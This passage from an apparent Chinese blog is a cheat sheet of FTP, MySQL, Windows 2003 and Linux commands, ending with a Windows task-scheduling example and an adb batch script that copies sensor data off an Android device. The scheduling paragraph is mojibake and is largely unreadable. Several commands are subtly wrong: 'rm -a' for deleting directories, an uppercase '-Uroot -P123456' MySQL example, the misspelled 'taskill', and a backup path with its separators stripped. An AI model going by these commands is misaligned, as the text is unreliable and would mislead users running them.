		prompt 交互提示模式<br />
		macdef 定义宏命令<br />
		lcd 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录<br />
		chmod 改变远端主机的文件权限<br />
		case 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母<br />
		cd remote－dir 进入远程主机目录<br />
		cdup 进入远程主机目录的父目录<br />
		! 在本地机中执行交互shell，exit回到ftp环境,如!ls＊.zip<br />
		<br />
		<br />
		MYSQL 命令：<br />
		mysql -h主机地址 -u用户名 －p密码 连接MYSQL;如果刚安装好MYSQL，超级用户root是没有密码的。<br />
		（例：mysql -h110.110.110.110 -Uroot -P123456<br />
		注:u与root可以不用加空格，其它也一样）<br />
		exit 退出MYSQL<br />
		mysqladmin -u用户名 -p旧密码 password 新密码 修改密码<br />
		grant select on 数据库.* to 用户名@登录主机 identified by &quot;密码&quot;; 增加新用户。（注意：和上面不同，下面的因为是MYSQL环境中的命令，所以后面都带一个分号作为命令结束符）<br />
		show databases;&nbsp; 显示数据库列表。刚开始时才两个数据库：mysql和test。mysql库很重要它里面有MYSQL的系统信息，我们改密码和新增用户，实际上就是用这个库进行操作。<br />
		<br />
		use mysql；<br />
		show tables;&nbsp; 显示库中的数据表<br />
		describe 表名; 显示数据表的结构<br />
		create database 库名;&nbsp; 建库<br />
		use 库名；<br />
		create table 表名 (字段设定列表)； 建表<br />
		drop database 库名;<br />
		drop table 表名； 删库和删表<br />
		delete from 表名;&nbsp; 将表中记录清空<br />
		select * from 表名; 显示表中的记录<br />
		mysqldump --opt school&gt;school.bbb&nbsp; 备份数据库：（命令在DOS的mysqlin目录下执行）;注释:将数据库school备份到school.bbb文件，school.bbb是一个文本文件，文件名任取，打开看看你会有新发现。<br />
		win2003系统下新增命令（实用部份）：<br />
		shutdown /参数&nbsp; 关闭或重启本地或远程主机。<br />
		参数说明：/S 关闭主机，/R 重启主机， /T 数字 设定延时的时间，范围0～180秒之间， /A取消开机，/M //IP 指定的远程主机。<br />
		例：shutdown /r /t 0 立即重启本地主机（无延时）<br />
		taskill /参数 进程名或进程的pid 终止一个或多个任务和进程。<br />
		参数说明：/PID 要终止进程的pid,可用tasklist命令获得各进程的pid，/IM 要终止的进程的进程名，/F 强制终止进程，/T 终止指定的进程及他所启动的子进程。<br />
		tasklist&nbsp; 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。<br />
		参数说明：/M 列出当前进程加载的dll文件，/SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。<br />
		<br />
		Linux系统下基本命令： 要区分大小写<br />
		uname&nbsp; 显示版本信息（同win2K的 ver）<br />
		dir&nbsp; 显示当前目录文件,ls -al 显示包括隐藏文件（同win2K的 dir）<br />
		pwd&nbsp; 查询当前所在的目录位置<br />
		cd&nbsp; cd　..回到上一层目录，注意cd 与..之间有空格。cd　/返回到根目录。<br />
		cat 文件名&nbsp; 查看文件内容<br />
		cat &gt;abc.txt&nbsp; 往abc.txt文件中写上内容。<br />
		more 文件名&nbsp; 以一页一页的方式显示一个文本文件。<br />
		cp&nbsp; 复制文件<br />
		mv&nbsp; 移动文件<br />
		rm 文件名&nbsp; 删除文件，rm -a 目录名删除目录及子目录<br />
		mkdir 目录名&nbsp; 建立目录<br />
		rmdir&nbsp; 删除子目录，目录内没有文档。<br />
		chmod 设定档案或目录的存取权限<br />
		grep 在档案中查找字符串<br />
		diff 档案文件比较<br />
		find 档案搜寻<br />
		date&nbsp; 现在的日期、时间<br />
		who&nbsp; 查询目前和你使用同一台机器的人以及Login时间地点<br />
		w 查询目前上机者的详细资料<br />
		whoami&nbsp; 查看自己的帐号名称<br />
		groups 查看某人的Group<br />
		passwd 更改密码<br />
		history 查看自己下过的命令<br />
		ps 显示进程状态<br />
		kill 停止某进程<br />
		gcc 黑客通常用它来编译C语言写的文件<br />
		su&nbsp; 权限转换为指定使用者<br />
		telnet IP&nbsp; telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。<br />
		ftp ftp连接上某服务器（同win2K）<br />
		<br />
		<br />
		Windows 排程例<br />
		若要在 Windows 系y上幼踊的浞莨ぷ鳎排程服毡仨绦兄小Ｄ可以利用下列指令舆@服眨<br />
		&nbsp;&nbsp; net start schedule<br />
		<br />
		如果排程服照在绦兄校t工作可以利用 at 指令砑右耘懦蹋@指令是用砗艚信次n backup.cmd (backup.cmd 的热菘梢栽Windows 的浞菖懦淘素找到)。如果您想要在每星期五的下午 8 c整绦羞@指令，t必呼叫下列指令：<br />
		&nbsp;&nbsp; at 20:00 /every:f cmd /c c::db2C21sapscriptsackup.cmd</p>
	<p align="left">
		分类: <a href="http://www.cnblogs.com/SunShineYPH/category/347125.html" target="_blank">脚本教程</a></p>
	<p align="left">
		&nbsp;</p>
	<p align="left">
		&nbsp;</p>
	<p align="left">
		-------</p>
	<p align="left">
		echo off<br />
		adb wait-for-device<br />
		adb remount<br />
		set a=%date:~0,4%<br />
		set b=%date:~5,2%<br />
		set c=%date:~8,2%<br />
		set d=%time:~0,2%<br />
		set e=%time:~3,2%<br />
		set f=%time:~6,2%<br />
		adb pull /sdcard/rawdata/ rawdata/%a%%b%%c%%d%%e%%f%<br />
		adb pull /sdcard/MPTest/ MPTest/%a%%b%%c%%d%%e%%f%<br />
		adb pull /sdcard/Psensor/PsensorValue.txt Psensor/%a%%b%%c%%d%%e%%f%.txt</p>
	<p align="left">
		-------<br />
		&nbsp;</p>
	<p>
		&nbsp;</p>
	<p>
		&nbsp;</p>
</div>
